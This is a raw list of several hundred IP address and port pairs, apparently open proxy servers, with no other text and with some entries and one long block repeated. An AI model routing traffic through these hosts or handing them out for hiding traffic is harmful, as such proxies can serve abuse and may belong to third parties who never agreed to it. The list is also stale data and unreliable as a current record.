45.239.123.18:999
45.251.74.228:80
45.5.119.86:4153
45.65.129.171:5678
45.73.0.118:5678
45.79.155.9:9999
45.88.159.79:8081
45.90.57.69:40022
46.101.13.77:80
46.101.179.133:38189
46.101.195.163:8080
46.101.230.20:7497
46.101.49.62:80
46.105.35.193:8080
46.146.227.89:1080
46.147.194.197:1080
46.151.105.34:8081
46.151.189.39:8081
46.161.196.174:4145
46.171.28.162:59311
46.174.234.96:5678
46.174.235.235:5678
46.175.4.76:5678
46.188.2.42:5678
46.188.53.61:3629
46.188.82.63:4153
46.214.153.223:5678
46.231.72.35:5678
46.241.57.29:1080
46.249.123.165:6565
46.249.123.169:6565
46.29.229.77:4145
46.98.206.15:5678
47.108.217.191:8118
47.113.179.6:10705
47.113.86.227:10705
47.180.63.37:54321
47.240.226.173:1080
47.242.40.222:8888
47.243.40.107:80
47.243.75.202:58853
47.243.9.243:51080
47.245.56.108:18181
47.252.4.64:8888
47.254.153.200:80
47.254.195.78:443
47.51.51.190:8080
47.56.69.11:8000
47.57.188.208:80
47.74.152.29:8888
47.74.226.8:5001
47.89.153.213:80
47.89.185.178:8888
47.91.15.175:80
47.92.113.71:80
47.93.239.66:1080
49.12.156.165:80
49.156.38.126:5678
49.156.42.186:5678
49.174.224.14:8118
49.231.140.12:8080
49.49.191.141:8080
49.51.186.129:21127
49.51.69.212:21127
49.51.74.195:21127
5.1.104.67:33041
5.104.174.199:23500
5.11.17.230:1080
5.135.191.56:56750
5.161.100.145:1080
5.178.217.227:31019
5.188.136.52:8080
5.188.64.79:5678
5.189.146.59:5713
5.189.184.6:80
5.196.214.181:3128
5.196.63.97:8080
5.202.191.226:80
5.202.191.226:8080
5.22.196.30:8080
5.226.125.10:10801
5.35.81.25:8080
5.58.110.249:8080
5.58.33.187:5678
5.58.53.216:1085
50.192.195.69:39792
50.199.46.20:32100
50.223.138.87:80
50.232.250.157:8080
50.234.24.129:32100
50.235.117.234:39593
50.237.98.130:1080
50.238.47.85:32100
50.242.122.141:32100
50.250.205.21:32100
50.250.56.129:48380
50.255.17.229:32100
51.103.108.84:8000
51.103.18.89:8000
51.103.19.39:8000
51.103.20.134:8000
51.103.27.73:8000
51.103.31.21:8000
51.103.42.231:8000
51.103.76.148:8000
51.104.48.10:8000
51.104.49.218:8000
51.104.50.22:8000
51.104.53.148:8000
51.104.53.182:8000
51.104.54.231:8000
51.15.242.202:8888
51.159.162.151:80
51.159.4.98:80
51.178.51.28:7497
51.210.21.189:1080
51.222.13.193:10084
51.222.146.133:7497
51.254.211.171:7497
51.38.32.239:34130
51.38.71.114:35186
51.68.123.217:7497
51.68.125.26:7497
51.68.220.201:8080
51.68.39.62:47900
51.68.87.73:45177
51.77.141.29:1081
51.77.73.67:31979
51.79.51.174:10328
51.83.133.132:62638
51.83.140.70:8181
51.83.190.248:19050
51.83.35.125:13493
51.89.194.19:18786
51.91.151.47:53341
51.91.21.129:44121
52.170.2.106:443
52.28.99.91:1080
54.153.124.39:80
54.180.117.35:80
54.36.230.214:1080
54.37.138.158:7497
58.147.171.106:10801
58.208.181.186:7890
58.215.199.34:7302
58.22.60.174:1080
58.255.226.56:1080
58.48.84.30:7302
58.75.126.235:4145
59.11.153.88:80
59.15.28.113:3128
59.153.24.185:5678
59.58.151.61:4216
59.98.4.70:8080
60.12.77.43:7300
60.165.35.64:7302
60.2.35.98:9091
60.215.109.34:7302
60.251.183.62:80
61.130.151.230:7302
61.135.30.54:7302
61.154.96.218:57114
61.178.172.95:7300
61.19.145.66:8080
61.216.156.222:60808
61.216.185.88:60808
61.7.146.7:80
61.7.178.153:8080
61.74.251.105:8081
61.78.63.200:30000
61.79.139.30:80
61.8.77.3:8088
62.103.186.66:4153
62.112.118.14:8080
62.122.201.246:50129
62.171.150.48:43033
62.171.166.158:10535
62.171.166.158:40063
62.182.114.164:60731
62.193.108.135:1981
62.193.108.136:1976
62.193.108.136:1981
62.201.220.50:60212
62.201.233.59:4145
62.253.84.5:3333
62.60.160.252:9000
62.73.127.98:10801
62.94.218.90:8080
63.151.67.7:8080
63.151.9.74:64312
64.124.145.1:1080
64.225.115.27:7497
64.225.65.54:8118
64.227.104.2:13166
64.89.249.1:47124
65.108.156.146:8080
65.169.38.73:26592
65.186.60.165:5678
65.38.21.118:80
66.118.198.247:54321
66.135.227.178:4145
66.135.227.181:4145
66.175.222.195:7497
66.42.224.229:41679
66.42.60.190:21358
67.201.33.10:25283
67.206.213.202:4145
67.210.146.50:11080
67.22.223.9:39593
68.183.88.14:7497
68.235.35.155:808
69.163.252.140:10754
69.163.252.140:1080
69.61.200.104:36181
70.166.167.38:57728
70.166.167.55:57745
70.82.75.118:4153
72.195.114.169:4145
72.195.114.184:4145
72.195.34.35:27360
72.195.34.41:4145
72.195.34.42:4145
72.195.34.58:4145
72.195.34.59:4145
72.195.34.60:27391
72.206.181.103:4145
72.206.181.105:64935
72.206.181.123:4145
72.206.181.97:64943
72.210.208.101:4145
72.210.221.197:4145
72.210.221.223:4145
72.210.252.134:46164
72.210.252.137:4145
72.217.216.239:4145
72.221.164.34:60671
72.221.171.130:4145
72.221.171.135:4145
72.221.172.203:4145
72.221.232.152:4145
72.221.232.155:4145
72.49.49.11:31034
74.95.1.114:33108
75.119.150.125:28089
76.81.6.107:31008
77.105.17.13:6666
77.105.33.13:6666
77.120.163.103:42208
77.235.23.130:5678
77.235.28.229:4153
77.236.237.177:8080
77.236.237.241:1256
77.238.79.111:8080
77.242.133.172:5678
77.37.155.85:1080
77.46.138.233:8080
77.46.138.38:8080
77.46.138.49:8080
77.46.153.185:5678
77.48.246.114:7497
77.65.50.118:34159
77.70.35.87:37475
77.85.104.54:1080
77.89.204.254:4145
77.95.229.224:9051
78.109.139.51:5678
78.128.124.9:50246
78.133.163.190:4145
78.152.168.145:8001
78.154.180.52:81
78.30.230.117:50932
78.31.92.145:1080
78.31.94.129:1080
78.37.40.1:4153
78.38.100.121:8080
78.38.108.194:1080
78.38.108.195:1080
78.38.108.199:1080
78.83.194.186:5678
78.83.199.235:53281
78.83.242.229:4145
78.84.136.235:4145
79.101.55.161:53281
79.111.13.155:50625
79.121.31.86:5678
79.127.56.147:8080
79.127.56.148:8080
79.135.219.223:8080
79.143.225.152:31270
79.253.201.252:8080
79.98.1.32:34746
8.134.50.79:10705
8.209.220.34:80
8.209.246.6:80
8.210.252.121:48091
8.219.75.219:10088
8.242.172.174:8080
8.242.205.41:9991
8.242.207.202:8080
80.191.162.2:514
80.191.40.41:5678
80.194.38.106:3333
80.235.239.130:1080
80.240.201.62:83
80.240.202.218:8080
80.244.226.92:8080
80.25.87.49:57082
80.252.5.34:7001
80.48.119.28:8080
80.52.223.98:5678
80.63.107.90:4153
80.65.28.57:30962
80.72.25.39:1080
80.78.237.2:55443
80.80.164.164:10801
80.80.167.246:10801
80.81.232.145:5678
80.82.147.1:4153
80.82.147.4:4153
80.89.137.214:4145
80.92.227.185:5678
81.12.106.158:8080
81.134.57.82:3128
81.143.236.200:443
81.150.169.217:5678
81.16.1.71:5678
81.163.36.210:42967
81.174.11.159:61743
81.18.50.174:6666
81.183.253.34:4145
81.200.123.74:80
81.213.148.243:808
81.22.103.65:80
81.252.38.12:8080
81.91.137.42:8080
81.91.144.190:55443
82.103.118.42:1099
82.103.70.227:4145
82.156.8.92:80
82.165.184.53:80
82.194.133.209:4153
82.210.8.173:80
82.66.106.125:80
82.99.204.198:1080
83.166.226.72:5678
83.168.84.130:4153
83.168.84.142:4153
83.171.127.72:1080
83.219.133.85:8080
83.234.147.166:6363
83.234.76.155:4145
83.238.80.10:8081
83.238.80.11:8081
83.238.80.14:8081
84.207.252.37:8080
84.54.185.203:8080
85.100.40.12:5678
85.117.56.174:25777
85.117.63.99:4153
85.133.130.18:8080
85.133.229.10:1080
85.195.104.71:80
85.196.179.34:8080
85.198.142.186:8081
85.208.252.138:9050
85.217.192.39:1414
85.217.192.39:4145
85.234.126.107:55555
85.237.62.189:3629
85.30.215.48:32946
85.92.164.179:4145
86.133.173.60:8118
86.171.131.105:8118
87.245.209.76:8080
87.250.63.172:8118
87.255.240.213:1080
88.119.204.62:4153
88.199.164.141:8081
88.212.232.212:7497
88.247.138.7:45534
88.255.101.227:8080
88.255.101.229:8080
88.255.101.230:8080
88.255.101.231:8080
88.255.101.235:8080
88.255.102.114:1082
88.255.102.32:8080
88.255.185.254:8080
88.255.217.48:1080
88.87.72.134:4145
89.108.74.82:1080
89.132.207.82:4145
89.133.95.177:4145
89.161.70.115:5678
89.19.115.32:5678
89.208.219.121:8080
89.216.101.99:5678
89.22.17.108:1080
89.222.132.31:3629
89.252.12.123:5678
89.38.96.219:3128
89.39.114.31:4153
90.112.170.228:80
91.106.65.64:9812
91.108.155.196:8080
91.121.169.13:5566
91.121.210.56:22678
91.121.210.56:54343
91.121.210.56:60191
91.121.210.56:61946
91.122.226.13:1080
91.135.80.66:33427
91.150.189.122:30389
91.150.77.57:56921
91.151.88.130:80
91.186.102.169:1080
91.194.239.122:8080
91.200.115.49:1080
91.201.122.35:8080
91.202.230.219:8080
91.203.25.28:4153
91.209.11.131:80
91.209.11.132:80
91.214.31.234:8080
91.224.168.22:8080
91.230.138.11:4145
91.232.241.114:8080
91.234.127.222:53281
91.241.21.237:9812
91.242.213.247:8080
91.246.213.104:4145
91.90.180.185:8080
91.93.118.3:8090
92.207.253.226:38157
92.247.147.210:8080
92.247.2.26:21231
92.42.8.22:4153
92.84.56.10:47054
92.86.92.126:42740
93.105.40.62:41258
93.117.72.27:55770
93.119.166.150:5678
93.123.226.23:81
93.145.17.218:8080
93.152.172.209:8080
93.157.234.178:8080
93.157.63.235:42079
93.171.241.18:1080
93.175.194.155:3629
93.176.245.226:8291
93.30.230.148:0718
93.40.5.232:5678
93.41.226.246:8118
93.83.108.58:4153
93.86.63.73:8080
93.91.112.247:41258
94.101.140.131:9999
94.103.85.88:9300
94.130.182.121:5566
94.154.19.226:1080
94.180.253.213:1080
94.198.215.22:52477
94.199.18.198:48875
94.23.91.209:80
94.230.183.226:8080
94.232.11.178:58028
94.240.24.91:5678
94.247.244.120:3128
94.72.61.46:1080
94.74.132.129:808
94.74.166.97:808
94.75.76.10:8080
94.75.76.3:8080
94.79.54.7:51439
95.0.168.46:1981
95.0.168.47:1981
95.0.168.61:1981
95.0.206.19:8080
95.0.66.86:8080
95.0.90.243:8080
95.111.233.170:3000
95.140.31.39:41890
95.142.223.24:56379
95.142.40.79:60005
95.154.104.147:31387
95.167.29.50:8080
95.170.201.34:43018
95.171.5.144:1256
95.178.108.189:5678
95.217.144.183:44965
95.31.35.210:3629
95.42.55.92:4145
95.43.125.120:4153
95.68.225.138:1080
95.87.14.245:8181
96.45.169.55:8081
97.74.230.87:31365
97.87.248.14:80
98.103.88.147:46104
98.162.25.16:4145
98.162.25.23:4145
98.162.25.29:31679
98.162.25.4:31654
98.162.25.7:31653
98.162.96.41:4145
98.162.96.52:4145
98.162.96.53:10663
98.170.57.231:4145
98.170.57.249:4145
98.175.31.195:4145
98.178.72.21:10919
98.188.47.132:4145
98.188.47.150:4145
167.235.135.110:80
51.159.162.151:80
83.229.73.175:80
23.238.33.186:80
101.68.58.135:8085
47.95.254.71:80
222.175.22.197:9091
176.192.70.58:8006
1.85.52.250:9797
117.160.250.130:81
206.189.146.13:8080
43.251.135.19:8081
118.107.44.181:8000
5.202.103.100:80
117.160.250.132:8080
137.184.197.190:80
119.7.135.19:9091
103.136.207.162:80
118.212.152.82:9091
46.151.105.34:8081
112.49.34.128:9091
164.132.170.100:80
222.139.221.185:9091
13.127.179.255:80
183.247.221.119:30001
143.244.134.24:80
103.36.10.212:8080
31.146.216.246:8080
102.38.5.161:8080
123.157.233.138:9091
125.71.219.28:8081
117.160.250.131:81
212.57.136.248:8080
201.71.2.144:999
47.107.139.218:3129
137.184.245.121:8080
83.229.72.174:80
37.232.183.74:53281
43.251.135.19:8001
45.225.91.65:999
36.93.5.25:9812
103.156.14.194:3125
117.160.250.135:8080
181.212.45.228:8080
183.251.152.214:9091
45.233.67.233:999
80.191.244.100:3128
125.167.87.172:8080
188.133.188.50:8080
112.51.96.118:9091
83.151.4.172:57812
103.111.214.106:3129
120.28.81.13:8080
117.160.250.134:8081
178.72.89.106:8080
198.206.133.34:8118
211.20.112.1:5168
103.214.186.194:8080
5.195.40.27:8080
120.196.188.21:9091
171.97.235.143:8080
109.200.155.195:8080
112.250.110.172:9091
103.146.30.178:8080
114.95.135.19:9797
24.109.252.48:80
103.41.173.47:3128
36.67.237.147:3128
37.236.60.35:80
110.74.203.250:8080
58.17.24.162:9091
5.189.140.113:8118
167.249.20.8:999
104.37.102.181:8181
179.57.1.172:999
103.124.199.98:3125
117.160.250.131:8080
183.233.169.226:9091
62.205.169.74:53281
80.210.63.249:8080
190.104.5.173:8080
117.160.250.135:9999
38.84.74.3:80
218.7.171.91:3128
103.56.205.88:8085
68.183.231.190:80
105.112.142.210:8080
170.254.200.171:3180
177.234.212.91:999
38.10.246.85:999
168.90.121.19:8080
103.110.91.242:3128
94.16.15.100:3128
190.102.134.102:999
92.114.18.11:80
175.106.10.164:8089
139.255.67.52:3888
190.182.88.226:31883
200.6.190.148:999
209.126.6.159:80
190.2.213.35:6969
155.4.244.218:80
117.160.250.133:8081
36.95.75.3:8080
200.60.111.60:999
159.89.132.108:8989
103.4.164.206:8080
89.163.141.127:1080
45.5.145.164:8090
102.222.146.203:8080
196.203.83.249:9090
85.185.238.74:8080
77.237.91.214:3128
92.42.248.130:8888
181.129.138.114:30838
165.16.0.97:1981
103.166.10.57:3125
155.93.96.210:8080
178.253.248.146:8888
5.161.49.165:80
103.152.232.100:8080
45.55.62.171:3128
66.181.164.125:8080
181.205.124.34:999
117.160.250.137:8080
176.101.177.209:8080
190.146.1.148:999
177.54.229.1:9292
132.255.210.113:999
139.144.20.125:8081
41.57.6.45:8080
103.78.74.44:8080
182.253.40.134:8080
150.107.137.25:8080
103.146.189.86:8080
183.129.190.172:9091
114.88.240.115:55443
142.44.148.56:8080
161.82.183.156:80
139.59.1.14:8080
195.3.246.209:3128
118.97.47.250:55443
160.0.192.38:8080
217.19.36.62:8080
78.46.27.131:8080
43.243.174.3:82
200.170.210.237:8080
41.86.251.61:8080
202.109.157.61:9000
85.132.29.134:8080
110.172.151.146:8080
41.188.149.79:80
34.125.221.146:80
176.196.48.114:8080
175.139.116.201:80
134.249.151.4:40046
58.27.59.249:80
181.57.192.245:999
125.66.232.113:9091
62.193.108.144:1976
59.44.203.138:9091
165.16.46.215:8080
181.143.235.100:12345
190.90.224.122:999
89.234.181.148:3128
202.109.157.63:9000
137.184.100.135:80
222.175.61.62:9091
139.59.124.237:3128
190.196.20.166:42536
110.164.3.7:8888
200.24.157.126:999
38.41.29.78:8080
37.29.116.46:8080
51.15.242.202:8888
105.112.135.166:8080
190.61.61.70:8080
77.236.252.187:1256
162.223.88.90:3128
168.196.215.16:9999
202.131.159.202:80
201.163.31.177:999
42.48.130.2:17890
61.240.239.210:9091
194.31.55.247:80
37.236.60.35:8080
170.254.201.30:3180
116.197.130.71:80
103.231.78.36:80
110.74.206.134:8080
38.41.29.230:999
117.160.250.133:80
31.146.180.218:8080
189.201.191.9:999
75.106.98.189:8080
181.176.161.39:999
188.133.136.105:1256
186.67.192.246:8080
54.210.239.35:80
77.236.237.177:8080
101.109.34.128:8080
31.129.163.70:78
20.54.56.26:8080
91.150.77.57:54037
139.255.94.123:39635
51.142.137.198:3128
123.182.59.42:8089
27.72.240.214:56362
68.64.250.38:8080
91.150.77.58:54037
197.248.184.158:53281
103.155.54.14:84
101.33.254.130:80
117.160.250.130:9999
117.160.250.136:9999
3.138.46.196:80
154.212.7.242:999
143.110.151.242:3128
103.9.156.99:3128
185.73.115.191:3128
93.104.211.69:21
222.67.96.23:9000
103.177.224.54:5515
46.29.76.71:8080
47.107.61.215:8000
218.86.87.171:31661
88.247.138.7:56387
221.203.158.70:9091
91.205.196.190:8080
122.50.7.186:8080
52.88.105.39:80
138.122.6.6:999
128.30.16.217:3128
54.38.181.125:80
103.164.151.27:3125
83.219.133.85:8080
168.232.84.139:8080
138.117.77.214:999
42.2.189.238:80
39.175.92.35:30001
117.160.250.130:8081
95.140.31.39:41890
80.53.244.214:42462
103.61.139.126:80
38.49.129.154:999
121.40.217.65:1080
111.225.153.138:8089
154.113.19.30:8080
34.81.160.132:80
201.244.127.210:8080
103.18.77.18:8080
51.159.207.156:3128
120.37.177.50:9091
43.204.16.38:80
111.3.102.207:30001
187.217.54.84:80
117.160.250.132:81
114.55.89.245:8118
89.208.219.121:8080
117.160.250.136:8081
106.107.147.29:80
142.93.223.246:80
197.243.20.186:80
181.212.41.171:999
120.196.186.248:9091
167.99.124.118:80
183.237.47.54:9091
3.111.155.124:80
101.200.220.107:8080
155.138.197.162:80
213.232.127.202:8085
183.252.51.112:9091
125.66.100.112:9091
18.236.152.221:80
117.41.38.19:9000
111.160.204.146:9091
97.92.111.244:443
185.105.102.179:80
94.19.8.166:8080
183.247.202.208:30001
117.160.250.131:8081
165.16.27.34:1981
223.100.178.167:9091
3.91.222.40:80
218.75.38.154:9091
103.48.68.35:82
114.116.2.116:8001
167.99.131.11:80
117.160.250.133:8080
58.17.108.121:8085
200.116.198.177:35184
181.114.47.33:8080
47.92.68.151:80
106.14.64.22:1080
18.223.110.56:80
13.91.104.216:80
117.160.250.130:8080
104.211.29.96:80
188.32.39.56:8080
197.211.35.195:8080
58.253.210.122:8888
117.160.250.163:80
14.105.19.96:8060
51.103.137.65:80
213.61.179.198:80
125.123.212.99:8000
103.117.192.174:80
8.142.142.250:80
115.96.208.124:8080
5.56.132.144:3131
164.92.75.10:80
188.0.147.102:3128
117.160.250.136:8080
142.93.61.46:80
62.33.8.148:8081
208.180.202.147:80
216.137.184.253:80
124.156.100.105:8118
103.36.8.182:3125
112.2.34.99:9091
117.160.250.135:81
103.159.220.141:8080
91.202.230.219:8080
104.155.179.128:3128
170.244.210.110:999
122.2.28.114:8080
5.35.81.25:8080
120.24.103.177:80
181.65.169.37:999
202.8.74.10:8080
182.253.191.132:8080
51.104.203.226:37500
106.13.55.126:80
31.192.233.163:8118
182.74.63.189:82
198.49.68.80:80
195.3.245.193:3128
103.49.202.252:80
200.105.215.18:33630
122.155.165.191:3128
94.23.91.209:80
106.14.255.124:80
117.160.250.133:9999
120.37.121.209:9091
117.160.250.132:8081
192.99.54.97:14077
61.19.145.66:8080
62.171.188.233:8000
188.32.241.34:81
159.138.158.36:8888
3.226.168.144:80
120.82.174.128:9091
157.90.151.147:80
124.106.226.240:3128
43.255.113.232:8081
173.212.195.139:80
113.161.152.157:8080
202.61.204.51:80
3.12.32.170:3128
117.160.250.134:9999
219.143.118.67:80
114.115.223.222:8001
117.160.250.137:8081
116.113.68.130:9091
82.66.196.208:80
223.68.190.136:9091
117.160.250.134:8080
139.59.61.115:80
198.59.191.234:8080
117.160.250.163:9999
47.103.123.130:8118
211.161.103.139:9091
47.92.1.207:80
139.9.62.22:80
173.212.216.104:3128
8.141.251.188:3128
113.57.84.39:9091
117.160.250.132:9999
41.65.227.169:1981
119.7.135.3:9091
223.113.80.158:9091
104.244.75.218:8080
117.160.250.163:8081
124.223.139.78:80
178.253.236.139:8080
115.124.126.24:80
186.125.218.234:999
117.160.250.134:81
124.121.104.64:8080
116.227.169.192:8085
202.109.157.67:9000
189.173.168.174:999
111.59.194.52:9091
123.182.58.122:8089
119.180.173.232:8060
113.76.181.150:8000
117.158.146.215:9091
154.236.179.233:1981
221.176.216.226:9091
118.163.120.181:58837
81.200.123.74:80
174.139.41.164:9090
182.92.127.180:3128
103.177.224.54:3128
149.129.237.166:3128
39.107.120.65:6666
170.155.2.119:80
47.92.113.71:80
34.75.202.63:80
111.225.152.19:8089
103.88.238.227:8080
161.97.126.151:3128
94.242.55.10:80
141.95.155.221:80
113.21.236.147:80
182.72.203.255:80
51.79.207.228:3128
187.32.147.196:80
3.109.85.109:80
112.54.41.177:9091
138.0.126.68:6666
190.90.83.225:999
103.83.232.122:80
128.199.234.76:8080
103.231.231.82:8080
203.113.167.3:80
181.129.2.90:8081
200.24.219.21:999
117.160.250.130:80
123.182.58.254:8089
217.11.186.12:3128
1.116.161.55:80
117.160.250.163:8080
159.138.151.154:3128
121.22.53.166:9091
41.65.236.43:1981
218.203.68.12:9091
157.230.34.152:35219
157.100.26.69:80
207.154.252.96:80
117.160.250.135:8081
192.99.54.97:14092
182.90.224.115:3128
120.237.144.200:9091
52.47.137.181:80
120.237.144.57:9091
42.228.61.245:9091
158.58.173.147:80
134.0.63.134:8000
181.129.208.27:999
103.48.68.36:84
221.131.141.243:9091
71.86.129.131:8080
62.193.108.146:1976
87.245.170.247:3128
112.36.17.39:9091
161.49.91.13:1337
123.153.98.198:9091
203.89.126.250:80
49.231.0.178:58023
41.65.227.169:1976
177.234.212.92:999
84.22.42.61:3128
59.172.6.146:33080
174.81.78.64:48678
223.84.240.36:9091
68.183.191.179:33126
110.40.166.173:80
36.92.147.99:8080
183.249.7.226:9091
132.255.210.115:999
117.160.250.137:9999
172.105.184.208:8001
47.243.171.250:1081
134.238.7.162:8080
182.106.220.252:9091
179.60.235.248:8097
144.123.46.90:9091
31.220.109.82:80
200.37.199.187:999
113.101.114.28:81
185.108.141.19:8080
124.71.57.98:443
117.160.250.131:9999
216.254.142.47:80
123.182.59.126:8089
117.160.250.137:80
37.236.59.107:8080
112.132.53.100:8085
14.139.242.7:80
3.212.9.208:80
154.73.159.10:8585
117.160.250.136:81
188.32.216.189:8081
115.28.180.139:8080
157.100.56.180:999
191.252.178.3:80
103.143.196.50:8080
185.216.116.18:80
20.243.24.157:80
111.85.159.65:9091
39.175.82.253:30001
167.71.230.124:8080
112.120.41.171:80
117.160.250.163:81
60.209.97.182:9999
58.20.184.187:9091
117.160.250.137:81
117.160.250.133:81
202.43.147.167:6666
177.234.212.90:999
103.247.121.114:8080
139.0.4.34:8080
45.70.15.7:8080
103.74.147.10:83
159.192.253.235:8080
36.67.186.76:8080
200.94.142.215:999
93.123.226.23:81
79.120.177.106:8080
47.74.152.29:8888
143.198.228.250:80
45.156.31.60:9090
45.172.111.90:999
203.235.116.97:8080
103.153.232.41:8080
113.18.254.2:80
218.28.98.229:9091
103.76.12.42:80
118.107.44.181:80
123.130.115.217:9091
101.79.73.42:8090
110.40.138.124:8080
93.174.242.68:8080
37.236.59.107:80
103.167.222.19:8181
103.213.238.194:80
213.165.168.190:9898
190.202.150.186:3128
200.48.212.213:999
45.233.67.204:999
190.214.27.46:8080
194.225.227.134:3128
188.121.104.63:3128
45.189.255.1:999
41.65.168.51:1981
200.114.87.229:8080
182.148.8.178:8118
103.40.54.101:8080
38.45.33.1:999
103.148.178.228:80
45.173.231.155:999
111.225.152.224:8089
111.225.153.89:8089
103.137.218.105:83
200.229.147.2:999
65.21.118.165:8080
103.133.26.107:8181
103.40.54.99:8080
111.225.153.117:8089
103.164.180.90:8080
111.225.152.156:8089
117.54.114.96:80
38.10.247.132:999
117.54.114.35:80
117.54.114.33:80
103.106.112.18:1234
103.16.133.226:8080
190.217.101.73:999
103.122.64.131:8080
115.186.177.25:8080
190.104.168.19:80
146.196.48.2:80
103.48.68.34:83
200.50.203.161:8090
157.100.23.244:999
5.190.92.74:8080
106.0.48.133:8080
157.100.12.138:999
179.42.78.49:999
92.46.60.26:80
191.102.64.147:999
141.11.246.133:3128
103.53.78.26:8080
161.97.92.160:80
37.32.28.88:3128
187.102.216.167:999
103.145.45.69:55443
190.186.18.177:999
105.112.191.250:3128
82.179.248.248:80
65.21.206.151:3128
62.182.66.251:9090
12.151.56.30:80
45.56.83.46:80
157.245.167.115:80
134.209.25.223:3128
161.35.78.6:80
51.15.100.229:3128
188.165.59.127:80
54.216.254.207:9000
104.236.73.28:80
173.212.216.104:3128
80.85.86.240:1235
178.209.51.218:7829
152.89.216.110:3128
20.230.193.232:80
51.250.80.131:80
213.230.90.106:3128
103.117.192.14:80
159.69.220.40:3128
103.127.1.130:80
195.189.123.213:3128
20.110.214.83:80
120.77.65.221:30001
169.57.1.85:8123
47.108.118.29:30001
195.135.242.141:8081
20.47.108.204:8888
123.56.222.253:30001
195.158.3.198:3128
103.115.252.18:80
50.205.202.249:3128
203.215.166.162:3128
47.97.126.226:30001
41.65.174.34:1981
39.104.19.120:8080
12.202.136.44:80
156.200.116.76:1976
103.117.231.42:80
103.115.26.254:80
64.238.140.247:3128
212.112.113.178:3128
154.236.184.70:1981
47.243.138.208:6677
168.8.172.2:80
66.196.238.181:3128
195.123.245.120:80
195.29.76.14:8080
35.170.197.3:8888
209.97.150.167:3128
45.167.124.5:9992
213.137.240.243:81
143.198.242.86:8048
178.254.41.91:8118
82.148.5.173:8888
185.82.98.22:8091
157.245.33.179:80
153.122.1.160:80
103.60.161.2:80
185.148.223.76:3128
103.217.213.125:55443
117.54.114.103:80
117.54.114.96:80
172.105.190.51:80
221.4.241.198:9091
103.145.76.44:80
122.155.165.191:3128
8.213.137.21:6969
185.51.10.19:80
195.211.219.146:5555
111.91.176.182:80
120.26.14.114:8888
34.132.27.0:3128
61.79.139.30:80
58.246.58.150:9002
139.9.64.238:443
103.231.78.36:80
183.111.25.253:80
195.158.30.232:3128
111.72.218.180:9091
159.89.195.14:80
119.184.185.80:8118
104.128.228.69:8118
209.166.175.201:8080
186.176.212.214:9080
176.214.97.13:8081
5.252.161.48:3128
106.14.255.124:80
211.103.138.117:8000
213.32.75.44:9300
221.6.201.74:9999
27.255.58.74:8080
182.253.181.10:8080
82.140.235.246:55443
121.199.78.228:8888
82.114.97.157:1256
197.243.14.59:8888
103.155.199.24:8181
102.164.252.150:8080
82.179.248.248:80
65.21.206.151:3128
62.182.66.251:9090
12.151.56.30:80
45.56.83.46:80
157.245.167.115:80
134.209.25.223:3128
161.35.78.6:80
51.15.100.229:3128
188.165.59.127:80
54.216.254.207:9000
104.236.73.28:80
173.212.216.104:3128
80.85.86.240:1235
178.209.51.218:7829
152.89.216.110:3128
20.230.193.232:80
51.250.80.131:80
213.230.90.106:3128
103.117.192.14:80
159.69.220.40:3128
103.127.1.130:80
195.189.123.213:3128
20.110.214.83:80
120.77.65.221:30001
169.57.1.85:8123
47.108.118.29:30001
195.135.242.141:8081
20.47.108.204:8888
123.56.222.253:30001
195.158.3.198:3128
103.115.252.18:80
50.205.202.249:3128
203.215.166.162:3128
47.97.126.226:30001
41.65.174.34:1981
39.104.19.120:8080
12.202.136.44:80
156.200.116.76:1976
103.117.231.42:80
103.115.26.254:80
64.238.140.247:3128
212.112.113.178:3128
154.236.184.70:1981
47.243.138.208:6677
168.8.172.2:80
66.196.238.181:3128
195.123.245.120:80
195.29.76.14:8080
35.170.197.3:8888
209.97.150.167:3128
45.167.124.5:9992
213.137.240.243:81
143.198.242.86:8048
178.254.41.91:8118
82.148.5.173:8888
185.82.98.22:8091
157.245.33.179:80
153.122.1.160:80
103.60.161.2:80
185.148.223.76:3128
103.217.213.125:55443
117.54.114.103:80
117.54.114.96:80
172.105.190.51:80
221.4.241.198:9091
103.145.76.44:80
122.155.165.191:3128
8.213.137.21:6969
185.51.10.19:80
195.211.219.146:5555
111.91.176.182:80
120.26.14.114:8888
34.132.27.0:3128
61.79.139.30:80
58.246.58.150:9002
139.9.64.238:443
103.231.78.36:80
183.111.25.253:80
195.158.30.232:3128
111.72.218.180:9091
159.89.195.14:80
119.184.185.80:8118
104.128.228.69:8118
209.166.175.201:8080
186.176.212.214:9080
176.214.97.13:8081
5.252.161.48:3128
106.14.255.124:80
211.103.138.117:8000
213.32.75.44:9300
221.6.201.74:9999
27.255.58.74:8080
182.253.181.10:8080
82.140.235.246:55443
121.199.78.228:8888
82.114.97.157:1256
197.243.14.59:8888
103.155.199.24:8181
102.164.252.150:8080
58.20.184.187:9091
80.246.128.14:8080
39.107.33.254:8090
49.7.19.74:80
222.65.228.80:8085
117.54.114.100:80
5.252.161.48:8080
203.243.51.111:8001
212.46.230.102:6969
47.74.152.29:8888
123.56.175.31:3128
94.23.77.8:3128
213.212.210.252:1981
154.66.109.209:8080
206.189.23.38:8048
120.220.220.95:8085
202.180.20.11:55443
156.200.116.76:1981
89.232.202.106:3128
211.138.6.37:9091
41.65.236.48:1981
213.222.34.200:53281
190.26.201.194:8080
142.93.215.210:80
85.121.211.139:2019
103.119.60.12:80
103.148.72.126:80
120.237.57.83:9091
185.31.175.15:8080
103.14.234.238:8080
136.228.160.250:8080
47.176.153.17:80
85.221.247.236:8080
61.191.56.60:8085
154.85.58.149:80
112.126.85.190:8118
74.82.50.155:3128
43.255.113.232:8081
113.161.85.18:19132
222.111.184.59:80
89.218.186.134:3128
47.252.4.64:8888
157.100.12.138:999
103.147.77.66:5012
46.250.88.194:3128
110.170.126.13:3128
103.123.64.20:8888
94.102.193.77:1500
185.172.129.138:3128
201.77.108.130:999
122.15.131.65:57873
94.242.54.119:3128
45.181.122.74:999
176.196.250.86:3128
109.194.101.128:3128
45.185.206.30:999
110.77.236.107:8080
41.254.45.128:8080
91.107.15.221:53281
156.200.116.72:1981
41.65.251.83:1976
112.6.117.135:8085
95.217.84.58:8118
80.252.5.34:7001
185.127.224.60:41890
167.114.185.69:3128
95.0.7.17:8080
152.32.218.99:8000
176.115.197.118:8080
146.56.159.124:1081
167.235.63.238:3128
176.57.188.32:443
58.20.235.180:9091
196.192.168.77:8080
142.132.143.86:11294
183.247.202.208:30001
161.97.74.153:81
194.233.77.110:6666
103.103.3.6:8080
154.236.168.181:1981
122.116.150.2:9000
171.6.17.29:8080
61.61.26.181:80
63.151.67.7:8080
202.50.53.107:8080
51.250.17.27:8080
88.255.201.134:8080
45.190.79.176:999
200.116.198.177:35184
181.63.213.66:8089
190.90.242.210:999
